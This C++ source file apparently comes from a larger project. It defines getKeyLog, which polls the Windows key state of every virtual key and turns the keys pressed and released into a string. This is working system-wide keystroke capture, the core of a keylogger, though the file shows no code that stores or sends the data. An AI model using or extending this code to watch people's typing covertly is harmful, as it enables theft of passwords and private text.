#include "KeyLog.h"

#include "../../Library.h"

std::string getKeyLog(bool keyDown[]) {
    std::unordered_map<int, std::string> keyMap = {
        {13, "Enter"},
        {8, "Backspace"},
        {9, "Tab"},
        {32, "Space"},
        {27, "Escape"},
        {38, "ArrowUp"},
        {40, "ArrowDown"},
        {37, "ArrowLeft"},
        {39, "ArrowRight"},
        {VK_LBUTTON, "LeftMouseClick"},
        {VK_RBUTTON, "RightMouseClick"},
        {VK_MBUTTON, "MiddleMouseClick"},
        // Add more key mappings as needed
    };

    std::string key = "";
    for (int i = 0; i < 256; i++) {
        if (GetAsyncKeyState(i) & 0x8000) {
            if (!keyDown[i]) { 
                keyDown[i] = true;
            }
        } else {
            if (keyDown[i]) { 
                keyDown[i] = false;
                if (keyMap.find(i) != keyMap.end()) {
                    key += keyMap[i];
                } else {
                    key += static_cast<char>(i);
                }
            }
        }
    }
    // std::cout << "in KeyLog" << key << "\n";
    return key;
}